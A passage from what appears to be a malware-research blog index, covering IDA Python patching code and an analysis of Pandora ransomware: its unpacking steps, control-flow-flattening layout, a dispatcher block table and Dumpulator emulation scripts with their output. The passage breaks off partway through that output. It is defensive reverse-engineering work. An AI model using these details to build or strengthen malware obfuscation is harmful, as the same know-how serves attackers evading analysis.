statisfies condition next_state_info_1 = state_info[1][0] next_state_info_2 = state_info[1][1] f = Flags(next_state_info_1[1]) conditional_jmp_instruction = b&#39; x0F x85&#39; if not f.ZF: # Found our conditional state next_state_info_1 conditional_jmp_address = state_table[next_state_info_1[0]][0] unconditional_jmp_address = state_table[next_state_info_2[0]][0] else: # Found our conditional state next_state_info_2 conditional_jmp_address = state_table[next_state_info_2[0]][0] unconditional_jmp_address = state_table[next_state_info_1[0]][0] if &quot;cmovb&quot; == instruction: # Use a JB (CF=1) # Check the flags for both next states # Make sure on one flag set statisfies condition next_state_info_1 = state_info[1][0] next_state_info_2 = state_info[1][1] f = Flags(next_state_info_1[1]) conditional_jmp_instruction = b&#39; x0F x82&#39; if f.CF: # Found our conditional state next_state_info_1 conditional_jmp_address = state_table[next_state_info_1[0]][0] unconditional_jmp_address = state_table[next_state_info_2[0]][0] else: # Found our conditional state next_state_info_2 conditional_jmp_address = state_table[next_state_info_2[0]][0] unconditional_jmp_address = state_table[next_state_info_1[0]][0] # Increment to next instruction ptr = next_head(ptr) # Build patch for conditional jmp jmp_rel = conditional_jmp_address - (ptr + 6) patch_cond_jmp = conditional_jmp_instruction + struct.pack(&#39;&lt;i&#39;,jmp_rel) # Patch bytes #print(f&quot;Conditional patch (cond) {patch_cond_jmp} at {hex(ptr)}&quot;) ida_bytes.patch_bytes(ptr,patch_cond_jmp) ptr += 6 # Build patch for unconditional jmp jmp_rel = unconditional_jmp_address - (ptr + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) # Patch bytes ida_bytes.patch_bytes(ptr,patch_jmp) #print(f&quot;Conditional patch (uncon) {patch_jmp} at {hex(ptr)}&quot;) break . TODO . There are a few things we can improve on. First, we seem to have some orphaned obbs once we do the patching. This is likely becuase we didn&#39;t test one of the states. . This means that we have some error in our path traversal through the dispatcher. All possibilites should be reachable from the entrypoint (by definition). . Possibly we need to keep the sim manager state for new eax state we test instead of resetting it. .",
            "url": "https://research.openanalysis.net/angr/symbolic%20execution/deobfuscation/research/2022/03/26/angr_notes.html",
            "relUrl": "/angr/symbolic%20execution/deobfuscation/research/2022/03/26/angr_notes.html",
            "date": " ‚Ä¢ Mar 26, 2022"
        }
        
    
  
    
        ,"post57": {
            "title": "Pandora Ransomware",
            "content": "There was a &#39;Not Found&#39; error fetching URL: &#39;https://twitter.com/kienbigmummy/status/1504750051956240384/photo/1&#39; . . Overview . Sample: 5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b . Sample is x64 and is on malshare. . Unpacked sample 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 . References . f0wl blog Pandora Ransomware | Control Flow Flattening | Deobfuscation - Recovering an ollvm | stadeo deobfuscation tool | Control Flow Unflattening | . Stage 1 Unpacking . Stage1 is just a modified UPX. We can unpack it with the following steps. . removed X permissions from the first PE section memory | run till exception | excpetion EIP is OEP for PE | dump and reconstruct imports with Scylla | . Payload Obfuscation . The ransomware has both obfuscated strings and control flow obfuscation. The obfuscated strings can be deobfuscated directly with an emulator call to the deobfuscation function. The cf obfuscation requires special attention. . Control Flow Obfuscation . Many function in the binary have been obfuscated using two layers of obfuscation. First control flow flattening (CFF) has been applied to convert the original code basic blocks into a state machine and force all flow through a dispatcher. For each state the dispatcher determines the control flow. Then a second layer of obfuscation has been applied to the basic blocks that make up the dispatcher. The dispatcher bbs are seperated with conditional jmp statements that require a lookup in a hard coded jmp table. This hard coded jmp table may be an attempt to frustrate symbolic execution (a traditional tool for CFF deobfuscation.) The flow is discribed below. . basic blocks (bb) that contain the actual payload code are accessed via a state machine - each bb has a state | the dispatcher for the state machine uses the bb state as a key which is used to calculate jumps between it&#39;s own (dispatcher) basic blocks | the (dispatcher) bb uses a compare with the key/state to generate a conditional lookup in a hard coded jump table | the jump table contains an obfuscated address of the next bb, either another dispatcher bb or the original code bb | . Deobfuscation Steps . Our approach is to seperate the dispatcher bb from the payload bb. For each dispatcher bb the code is emulated with all conditions to generate the conditional jump addresses. The bb is then replaced with a simple compare and conditional jmp. Emulation is done with Dumpulator. . Once the dispatcher has been deobfuscated we should be able to see the control flow for the payload bb and futher simplify the dispatcher using more traditional tools, possibly removing it completely. . r14 = FFFFFFFFAE6529F8 00007FF6C4B068E3 | 3D E1A53B17 | cmp eax,173BA5E1 | not part of cf 00007FF6C4B068E8 | BA D8000000 | mov edx,D8 | rdx = 0xd8 00007FF6C4B068ED | BD 20010000 | mov ebp,120 | rbp = 0x120 00007FF6C4B068F2 | 48:0F4CD5 | cmovl rdx,rbp | 00007FF6C4B068F6 | 48:8B1411 | mov rdx,qword ptr ds:[rcx+rdx] | table:00007FF6C4B69640 + rdx = rdx=00007FF7164B42E9 00007FF6C4B068FA | 4C:01F2 | add rdx,r14 |rdx=00007FF7164B42E9 + r14 00007FF6C4B068FD | FFE2 | jmp rdx | rdx = 00007FF6C4B06CE1 . if the jump is relative it&#39;s for a code bb . if the jump is reg then it&#39;s a cf bb . if there is a ret this is the end . start = 0x00007FF6C4B067F0 last_jmp = 0x00007FF6C4B0706C end = 0x00007FF6C4B070D0 . build a table of bb the start is next head after jmp, end is jmp emulate patch the jmp for each table entry . IDA Produce Basic Block Table . There are two dispatcher bb formats, one that uses cmovl, cmovz, and one that uses setl and setz. We need to match both patterns and determine the type of condition for our jmp statement, and the eax cmp value. For each bb record the following information so it can be used in our emulator. . bb start | bb end | add cmov instruction | type of cmov instruction (l,z) | eax cmp value | jmp register | . Results: (bb_start, bb_end, eax_value, jmp_condition,jmp_condition_address, jmp_register) . # Basic blocks for dispatcher bb_table = [] # List of addresses of original code basic blocks bb_orig_table = [] ptr = 0x00007FF6C4B067C8 end = 0x00007FF6C4B070D0 bb_start = ptr while ptr &lt;= end: if print_insn_mnem(ptr) == &#39;jmp&#39;: op_type = idc.get_operand_type(ptr, 0) if op_type == o_reg: # This is a cf bb save it reg_name = print_operand(ptr, 0) # Get eax value first_instruction = print_insn_mnem(bb_start) if first_instruction == &#39;cmp&#39;: eax_cmp_value = get_operand_value(bb_start,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if &#39;cmovl&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;cmovl&#39; break elif &#39;cmovz&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;cmovz&#39; break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t contain cmovl or cmovz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue elif first_instruction == &#39;xor&#39;: # assume next instruction is the cmp, we should check ptr_cmp = next_head(bb_start) if &quot;cmp&quot; != print_insn_mnem(ptr_cmp): # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t contain have cmp after xor, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue eax_cmp_value = get_operand_value(ptr_cmp,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if &#39;setl&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;setl&#39; break elif &#39;setz&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;setz&#39; break elif &#39;setnz&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;setnz&#39; break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t contain setl or setz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue else: # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t match pattern, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue print(f&quot;Dispatcher bb {hex(bb_start)}&quot;) bb_table.append((bb_start,ptr,eax_cmp_value,jmp_condition,jmp_condition_address,reg_name)) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: # This is code bb don&#39;t save it print(f&quot;Original code bb {hex(bb_start)}&quot;) bb_orig_table.append(bb_start) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: ptr = next_head(ptr) . Emulate Basic Blocks . For each dispatcher bb emulate the block both satisfying the condition and not satisfying it to produce both the jmp address for the conditional jmp and the jmp address for the unconditional jmp. . DUMP_FILE = &#39;/tmp/pandora.dmp&#39; from dumpulator import Dumpulator dp = Dumpulator(DUMP_FILE, quiet=True) # temp_addr = dp.allocate(256) # dp.call(0x140001000, [temp_addr, 0x140017000]) # decrypted = dp.read_str(temp_addr) # print(f&quot;decrypted: &#39;{decrypted}&#39;&quot;) # # Obfuscation key for table values # dp.regs.r14 = 0xFFFFFFFFAE6529F8 # # Pointer to the jmp table # dp.regs.rcx = 0x00007FF6C4B69640 # dp.start(0x00007FF6C4B068E8,end=0x00007FF6C4B068FD) dp = Dumpulator(DUMP_FILE, quiet=True) #(bb_start, bb_end, eax_value, jmp_condition,jmp_condition_address, jmp_register) #bb_table = [(0x7ff6c4b067f0, 0x7ff6c4b06817, 0x10bc6c78, &#39;cmovl&#39;, 0x7ff6c4b067fa, &#39;rdx&#39;), (0x7ff6c4b06819, 0x7ff6c4b0682e, 0xffffffffc30bae2e, &#39;cmovl&#39;, 0x7ff6c4b06823, &#39;rdx&#39;), (0x7ff6c4b06830, 0x7ff6c4b06845, 0xffffffffa2992627, &#39;cmovl&#39;, 0x7ff6c4b0683a, &#39;rdx&#39;), (0x7ff6c4b06847, 0x7ff6c4b06861, 0xffffffffa22a16af, &#39;cmovl&#39;, 0x7ff6c4b06856, &#39;rdx&#39;), (0x7ff6c4b06863, 0x7ff6c4b0687d, 0xffffffff8cbc0434, &#39;cmovz&#39;, 0x7ff6c4b06872, &#39;rcx&#39;), (0x7ff6c4b068b0, 0x7ff6c4b068c5, 0x6c249751, &#39;cmovl&#39;, 0x7ff6c4b068ba, &#39;rdx&#39;), (0x7ff6c4b068c7, 0x7ff6c4b068e1, 0x3b2b8a1e, &#39;cmovl&#39;, 0x7ff6c4b068d6, &#39;rdx&#39;), (0x7ff6c4b068e3, 0x7ff6c4b068fd, 0x173ba5e1, &#39;cmovl&#39;, 0x7ff6c4b068f2, &#39;rdx&#39;), (0x7ff6c4b068ff, 0x7ff6c4b06918, 0x10bc6c78, &#39;setz&#39;, 0x7ff6c4b06906, &#39;rcx&#39;), (0x7ff6c4b069b0, 0x7ff6c4b069ca, 0xffffffffd43fb344, &#39;cmovl&#39;, 0x7ff6c4b069bf, &#39;rdx&#39;), (0x7ff6c4b069cc, 0x7ff6c4b069e6, 0xffffffffcef7092e, &#39;cmovl&#39;, 0x7ff6c4b069db, &#39;rdx&#39;), (0x7ff6c4b069e8, 0x7ff6c4b06a02, 0xffffffffc30bae2e, &#39;cmovz&#39;, 0x7ff6c4b069f7, &#39;rcx&#39;), (0x7ff6c4b06a30, 0x7ff6c4b06a4a, 0x7d71a1e3, &#39;cmovl&#39;, 0x7ff6c4b06a3f, &#39;rdx&#39;), (0x7ff6c4b06a4c, 0x7ff6c4b06a66, 0x7a980236, &#39;cmovl&#39;, 0x7ff6c4b06a5b, &#39;rdx&#39;), (0x7ff6c4b06a68, 0x7ff6c4b06a82, 0x6c249751, &#39;cmovz&#39;, 0x7ff6c4b06a77, &#39;rcx&#39;), (0x7ff6c4b06a99, 0x7ff6c4b06ab3, 0xffffffffc094d6c9, &#39;cmovl&#39;, 0x7ff6c4b06aa8, &#39;rdx&#39;), (0x7ff6c4b06ab5, 0x7ff6c4b06acf, 0xffffffffa2992627, &#39;cmovz&#39;, 0x7ff6c4b06ac4, &#39;rcx&#39;), (0x7ff6c4b06b09, 0x7ff6c4b06b1e, 0x3cd69d30, &#39;setl&#39;, 0x7ff6c4b06b10, &#39;rdx&#39;), (0x7ff6c4b06b20, 0x7ff6c4b06b39, 0x3b2b8a1e, &#39;setnz&#39;, 0x7ff6c4b06b27, &#39;rcx&#39;), (0x7ff6c4b06b63, 0x7ff6c4b06b7d, 0xffffffffecce8ff1, &#39;cmovl&#39;, 0x7ff6c4b06b72, &#39;rdx&#39;), (0x7ff6c4b06b7f, 0x7ff6c4b06b99, 0xffffffffd43fb344, &#39;cmovz&#39;, 0x7ff6c4b06b8e, &#39;rcx&#39;), (0x7ff6c4b06bbb, 0x7ff6c4b06bd5, 0x7d9d86f3, &#39;cmovl&#39;, 0x7ff6c4b06bca, &#39;rdx&#39;), (0x7ff6c4b06bd7, 0x7ff6c4b06bf1, 0x7d71a1e3, &#39;cmovz&#39;, 0x7ff6c4b06be6, &#39;rcx&#39;), (0x7ff6c4b06c45, 0x7ff6c4b06c5f, 0xffffffffa22a16af, &#39;cmovz&#39;, 0x7ff6c4b06c54, &#39;rcx&#39;), (0x7ff6c4b06ce1, 0x7ff6c4b06cfb, 0x173ba5e1, &#39;cmovz&#39;, 0x7ff6c4b06cf0, &#39;rcx&#39;), (0x7ff6c4b06e83, 0x7ff6c4b06e9d, 0xffffffffcef7092e, &#39;cmovz&#39;, 0x7ff6c4b06e92, &#39;rcx&#39;), (0x7ff6c4b06edc, 0x7ff6c4b06ef6, 0x7a980236, &#39;cmovz&#39;, 0x7ff6c4b06eeb, &#39;rcx&#39;), (0x7ff6c4b06f3d, 0x7ff6c4b06f56, 0xffffffffc094d6c9, &#39;setz&#39;, 0x7ff6c4b06f44, &#39;rcx&#39;), (0x7ff6c4b07008, 0x7ff6c4b07022, 0x3cd69d30, &#39;cmovz&#39;, 0x7ff6c4b07017, &#39;rcx&#39;), (0x7ff6c4b07052, 0x7ff6c4b0706c, 0xffffffffecce8ff1, &#39;cmovz&#39;, 0x7ff6c4b07061, &#39;rcx&#39;)] # Above is the old table that was missing one bb because we started our search too late bb_table = [(0x7ff6c4b067c8, 0x7ff6c4b067e2, 0x7d9d86f3, &#39;cmovz&#39;, 0x7ff6c4b067d7, &#39;rcx&#39;), (0x7ff6c4b067f0, 0x7ff6c4b06817, 0x10bc6c78, &#39;cmovl&#39;, 0x7ff6c4b067fa, &#39;rdx&#39;), (0x7ff6c4b06819, 0x7ff6c4b0682e, 0xffffffffc30bae2e, &#39;cmovl&#39;, 0x7ff6c4b06823, &#39;rdx&#39;), (0x7ff6c4b06830, 0x7ff6c4b06845, 0xffffffffa2992627, &#39;cmovl&#39;, 0x7ff6c4b0683a, &#39;rdx&#39;), (0x7ff6c4b06847, 0x7ff6c4b06861, 0xffffffffa22a16af, &#39;cmovl&#39;, 0x7ff6c4b06856, &#39;rdx&#39;), (0x7ff6c4b06863, 0x7ff6c4b0687d, 0xffffffff8cbc0434, &#39;cmovz&#39;, 0x7ff6c4b06872, &#39;rcx&#39;), (0x7ff6c4b068b0, 0x7ff6c4b068c5, 0x6c249751, &#39;cmovl&#39;, 0x7ff6c4b068ba, &#39;rdx&#39;), (0x7ff6c4b068c7, 0x7ff6c4b068e1, 0x3b2b8a1e, &#39;cmovl&#39;, 0x7ff6c4b068d6, &#39;rdx&#39;), (0x7ff6c4b068e3, 0x7ff6c4b068fd, 0x173ba5e1, &#39;cmovl&#39;, 0x7ff6c4b068f2, &#39;rdx&#39;), (0x7ff6c4b068ff, 0x7ff6c4b06918, 0x10bc6c78, &#39;setz&#39;, 0x7ff6c4b06906, &#39;rcx&#39;), (0x7ff6c4b069b0, 0x7ff6c4b069ca, 0xffffffffd43fb344, &#39;cmovl&#39;, 0x7ff6c4b069bf, &#39;rdx&#39;), (0x7ff6c4b069cc, 0x7ff6c4b069e6, 0xffffffffcef7092e, &#39;cmovl&#39;, 0x7ff6c4b069db, &#39;rdx&#39;), (0x7ff6c4b069e8, 0x7ff6c4b06a02, 0xffffffffc30bae2e, &#39;cmovz&#39;, 0x7ff6c4b069f7, &#39;rcx&#39;), (0x7ff6c4b06a30, 0x7ff6c4b06a4a, 0x7d71a1e3, &#39;cmovl&#39;, 0x7ff6c4b06a3f, &#39;rdx&#39;), (0x7ff6c4b06a4c, 0x7ff6c4b06a66, 0x7a980236, &#39;cmovl&#39;, 0x7ff6c4b06a5b, &#39;rdx&#39;), (0x7ff6c4b06a68, 0x7ff6c4b06a82, 0x6c249751, &#39;cmovz&#39;, 0x7ff6c4b06a77, &#39;rcx&#39;), (0x7ff6c4b06a99, 0x7ff6c4b06ab3, 0xffffffffc094d6c9, &#39;cmovl&#39;, 0x7ff6c4b06aa8, &#39;rdx&#39;), (0x7ff6c4b06ab5, 0x7ff6c4b06acf, 0xffffffffa2992627, &#39;cmovz&#39;, 0x7ff6c4b06ac4, &#39;rcx&#39;), (0x7ff6c4b06b09, 0x7ff6c4b06b1e, 0x3cd69d30, &#39;setl&#39;, 0x7ff6c4b06b10, &#39;rdx&#39;), (0x7ff6c4b06b20, 0x7ff6c4b06b39, 0x3b2b8a1e, &#39;setnz&#39;, 0x7ff6c4b06b27, &#39;rcx&#39;), (0x7ff6c4b06b63, 0x7ff6c4b06b7d, 0xffffffffecce8ff1, &#39;cmovl&#39;, 0x7ff6c4b06b72, &#39;rdx&#39;), (0x7ff6c4b06b7f, 0x7ff6c4b06b99, 0xffffffffd43fb344, &#39;cmovz&#39;, 0x7ff6c4b06b8e, &#39;rcx&#39;), (0x7ff6c4b06bbb, 0x7ff6c4b06bd5, 0x7d9d86f3, &#39;cmovl&#39;, 0x7ff6c4b06bca, &#39;rdx&#39;), (0x7ff6c4b06bd7, 0x7ff6c4b06bf1, 0x7d71a1e3, &#39;cmovz&#39;, 0x7ff6c4b06be6, &#39;rcx&#39;), (0x7ff6c4b06c45, 0x7ff6c4b06c5f, 0xffffffffa22a16af, &#39;cmovz&#39;, 0x7ff6c4b06c54, &#39;rcx&#39;), (0x7ff6c4b06ce1, 0x7ff6c4b06cfb, 0x173ba5e1, &#39;cmovz&#39;, 0x7ff6c4b06cf0, &#39;rcx&#39;), (0x7ff6c4b06e83, 0x7ff6c4b06e9d, 0xffffffffcef7092e, &#39;cmovz&#39;, 0x7ff6c4b06e92, &#39;rcx&#39;), (0x7ff6c4b06edc, 0x7ff6c4b06ef6, 0x7a980236, &#39;cmovz&#39;, 0x7ff6c4b06eeb, &#39;rcx&#39;), (0x7ff6c4b06f3d, 0x7ff6c4b06f56, 0xffffffffc094d6c9, &#39;setz&#39;, 0x7ff6c4b06f44, &#39;rcx&#39;), (0x7ff6c4b07008, 0x7ff6c4b07022, 0x3cd69d30, &#39;cmovz&#39;, 0x7ff6c4b07017, &#39;rcx&#39;), (0x7ff6c4b07052, 0x7ff6c4b0706c, 0xffffffffecce8ff1, &#39;cmovz&#39;, 0x7ff6c4b07061, &#39;rcx&#39;)] bb_jmp_table = [] def emulate_bb(bb_start, bb_end, eax_value, jmp_reg): dp.regs.eflags = 0 dp.regs.r15 = 0x190 dp.regs.r14 = 0x0FFFFFFFFAE6529F8 dp.regs.r13 = 0x10 dp.regs.r12 = 0x1B0 dp.regs.rcx = 0x00007FF6C4B69640 dp.regs.rax = eax_value dp.start(bb_start,end=bb_end) jmp_reg_value = dp.regs.__getattr__(jmp_reg) return jmp_reg_value ## We need to calculate two jmp addresses conditional on the eax compare ## based on these we can replace the control bb with conditional jmps based on the compare # def get_jmp(start_ea, end_ea, reg_name, jmp_cond): # dp.regs.r15 = 0x190 # dp.regs.r14 = 0x0FFFFFFFFAE6529F8 # dp.regs.r13 = 0x10 # dp.regs.r12 = 0x1B0 # dp.regs.rcx = 0x00007FF6C4B69640 # if jmp_cond: # else: # dp.start(start_ea,end=end_ea) # print(hex(dp.regs.__getattr__(reg_name))) for bb in bb_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] # One emulation to satisfy conditon and one without if jmp_condition == &#39;cmovl&#39; or jmp_condition == &#39;setl&#39;: jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value - 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == &#39;cmovz&#39; or jmp_condition == &#39;setz&#39;: jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == &#39;setnz&#39;: jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) print(f&quot;BB {hex(bb_start)}:{hex(bb_end)} - jmp_addr_satisfied: {hex(jmp_addr_satisfied)} - jmp_addr_unsatisfied: {hex(jmp_addr_unsatisfied)}&quot;) bb_jmp_table.append((bb_start,bb_end,eax_value,jmp_condition,jmp_condition_address,jmp_register,jmp_addr_satisfied,jmp_addr_unsatisfied)) for bb in bb_jmp_table: print(bb) . BB 0x7ff6c4b067c8:0x7ff6c4b067e2 - jmp_addr_satisfied: 0x7ff6c4b070d1 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b067f0:0x7ff6c4b06817 - jmp_addr_satisfied: 0x7ff6c4b06819 - jmp_addr_unsatisfied: 0x7ff6c4b068b0 BB 0x7ff6c4b06819:0x7ff6c4b0682e - jmp_addr_satisfied: 0x7ff6c4b06830 - jmp_addr_unsatisfied: 0x7ff6c4b069b0 BB 0x7ff6c4b06830:0x7ff6c4b06845 - jmp_addr_satisfied: 0x7ff6c4b06847 - jmp_addr_unsatisfied: 0x7ff6c4b06a99 BB 0x7ff6c4b06847:0x7ff6c4b06861 - jmp_addr_satisfied: 0x7ff6c4b06863 - jmp_addr_unsatisfied: 0x7ff6c4b06c45 BB 0x7ff6c4b06863:0x7ff6c4b0687d - jmp_addr_satisfied: 0x7ff6c4b0687f - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b068b0:0x7ff6c4b068c5 - jmp_addr_satisfied: 0x7ff6c4b068c7 - jmp_addr_unsatisfied: 0x7ff6c4b06a30 BB 0x7ff6c4b068c7:0x7ff6c4b068e1 - jmp_addr_satisfied: 0x7ff6c4b068e3 - jmp_addr_unsatisfied: 0x7ff6c4b06b09 BB 0x7ff6c4b068e3:0x7ff6c4b068fd - jmp_addr_satisfied: 0x7ff6c4b068ff - jmp_addr_unsatisfied: 0x7ff6c4b06ce1 BB 0x7ff6c4b068ff:0x7ff6c4b06918 - jmp_addr_satisfied: 0x7ff6c4b0691a - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b069b0:0x7ff6c4b069ca - jmp_addr_satisfied: 0x7ff6c4b069cc - jmp_addr_unsatisfied: 0x7ff6c4b06b63 BB 0x7ff6c4b069cc:0x7ff6c4b069e6 - jmp_addr_satisfied: 0x7ff6c4b069e8 - jmp_addr_unsatisfied: 0x7ff6c4b06e83 BB 0x7ff6c4b069e8:0x7ff6c4b06a02 - jmp_addr_satisfied: 0x7ff6c4b06a04 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06a30:0x7ff6c4b06a4a - jmp_addr_satisfied: 0x7ff6c4b06a4c - jmp_addr_unsatisfied: 0x7ff6c4b06bbb BB 0x7ff6c4b06a4c:0x7ff6c4b06a66 - jmp_addr_satisfied: 0x7ff6c4b06a68 - jmp_addr_unsatisfied: 0x7ff6c4b06edc BB 0x7ff6c4b06a68:0x7ff6c4b06a82 - jmp_addr_satisfied: 0x7ff6c4b06a84 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06a99:0x7ff6c4b06ab3 - jmp_addr_satisfied: 0x7ff6c4b06ab5 - jmp_addr_unsatisfied: 0x7ff6c4b06f3d BB 0x7ff6c4b06ab5:0x7ff6c4b06acf - jmp_addr_satisfied: 0x7ff6c4b06ad1 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06b09:0x7ff6c4b06b1e - jmp_addr_satisfied: 0x7ff6c4b06b20 - jmp_addr_unsatisfied: 0x7ff6c4b07008 BB 0x7ff6c4b06b20:0x7ff6c4b06b39 - jmp_addr_satisfied: 0x7ff6c4b067f0 - jmp_addr_unsatisfied: 0x7ff6c4b06b3b BB 0x7ff6c4b06b63:0x7ff6c4b06b7d - jmp_addr_satisfied: 0x7ff6c4b06b7f - jmp_addr_unsatisfied: 0x7ff6c4b07052 BB 0x7ff6c4b06b7f:0x7ff6c4b06b99 - jmp_addr_satisfied: 0x7ff6c4b06b9b - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06bbb:0x7ff6c4b06bd5 - jmp_addr_satisfied: 0x7ff6c4b06bd7 - jmp_addr_unsatisfied: 0x7ff6c4b067c8 BB 0x7ff6c4b06bd7:0x7ff6c4b06bf1 - jmp_addr_satisfied: 0x7ff6c4b06bf3 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06c45:0x7ff6c4b06c5f - jmp_addr_satisfied: 0x7ff6c4b06c61 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06ce1:0x7ff6c4b06cfb - jmp_addr_satisfied: 0x7ff6c4b06cfd - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06e83:0x7ff6c4b06e9d - jmp_addr_satisfied: 0x7ff6c4b06e9f - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06edc:0x7ff6c4b06ef6 - jmp_addr_satisfied: 0x7ff6c4b06ef8 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06f3d:0x7ff6c4b06f56 - jmp_addr_satisfied: 0x7ff6c4b06f58 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b07008:0x7ff6c4b07022 - jmp_addr_satisfied: 0x7ff6c4b07024 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b07052:0x7ff6c4b0706c - jmp_addr_satisfied: 0x7ff6c4b0706e - jmp_addr_unsatisfied: 0x7ff6c4b067f0 (140697838577608, 140697838577634, 2107475699, &#39;cmovz&#39;, 140697838577623, &#39;rcx&#39;, 140697838579921, 140697838577648) (140697838577648, 140697838577687, 280783992, &#39;cmovl&#39;, 140697838577658, &#39;rdx&#39;, 140697838577689, 140697838577840) (140697838577689, 140697838577710, 18446744072686906926, &#39;cmovl&#39;, 140697838577699, &#39;rdx&#39;, 140697838577712, 140697838578096) (140697838577712, 140697838577733, 18446744072142530087, &#39;cmovl&#39;, 140697838577722, &#39;rdx&#39;, 140697838577735, 140697838578329) (140697838577735, 140697838577761, 18446744072135251631, &#39;cmovl&#39;, 140697838577750, &#39;rdx&#39;, 140697838577763, 140697838578757) (140697838577763, 140697838577789, 18446744071775716404, &#39;cmovz&#39;, 140697838577778, &#39;rcx&#39;, 140697838577791, 140697838577648) (140697838577840, 140697838577861, 1814337361, &#39;cmovl&#39;, 140697838577850, &#39;rdx&#39;, 140697838577863, 140697838578224) (140697838577863, 140697838577889, 992709150, &#39;cmovl&#39;, 140697838577878, &#39;rdx&#39;, 140697838577891, 140697838578441) (140697838577891, 140697838577917, 389785057, &#39;cmovl&#39;, 140697838577906, &#39;rdx&#39;, 140697838577919, 140697838578913) (140697838577919, 140697838577944, 280783992, &#39;setz&#39;, 140697838577926, &#39;rcx&#39;, 140697838577946, 140697838577648) (140697838578096, 140697838578122, 18446744072975528772, &#39;cmovl&#39;, 140697838578111, &#39;rdx&#39;, 140697838578124, 140697838578531) (140697838578124, 140697838578150, 18446744072886880558, &#39;cmovl&#39;, 140697838578139, &#39;rdx&#39;, 140697838578152, 140697838579331) (140697838578152, 140697838578178, 18446744072686906926, &#39;cmovz&#39;, 140697838578167, &#39;rcx&#39;, 140697838578180, 140697838577648) (140697838578224, 140697838578250, 2104599011, &#39;cmovl&#39;, 140697838578239, &#39;rdx&#39;, 140697838578252, 140697838578619) (140697838578252, 140697838578278, 2056782390, &#39;cmovl&#39;, 140697838578267, &#39;rdx&#39;, 140697838578280, 140697838579420) (140697838578280, 140697838578306, 1814337361, &#39;cmovz&#39;, 140697838578295, &#39;rcx&#39;, 140697838578308, 140697838577648) (140697838578329, 140697838578355, 18446744072645564105, &#39;cmovl&#39;, 140697838578344, &#39;rdx&#39;, 140697838578357, 140697838579517) (140697838578357, 140697838578383, 18446744072142530087, &#39;cmovz&#39;, 140697838578372, &#39;rcx&#39;, 140697838578385, 140697838577648) (140697838578441, 140697838578462, 1020697904, &#39;setl&#39;, 140697838578448, &#39;rdx&#39;, 140697838578464, 140697838579720) (140697838578464, 140697838578489, 992709150, &#39;setnz&#39;, 140697838578471, &#39;rcx&#39;, 140697838577648, 140697838578491) (140697838578531, 140697838578557, 18446744073387544561, &#39;cmovl&#39;, 140697838578546, &#39;rdx&#39;, 140697838578559, 140697838579794) (140697838578559, 140697838578585, 18446744072975528772, &#39;cmovz&#39;, 140697838578574, &#39;rcx&#39;, 140697838578587, 140697838577648) (140697838578619, 140697838578645, 2107475699, &#39;cmovl&#39;, 140697838578634, &#39;rdx&#39;, 140697838578647, 140697838577608) (140697838578647, 140697838578673, 2104599011, &#39;cmovz&#39;, 140697838578662, &#39;rcx&#39;, 140697838578675, 140697838577648) (140697838578757, 140697838578783, 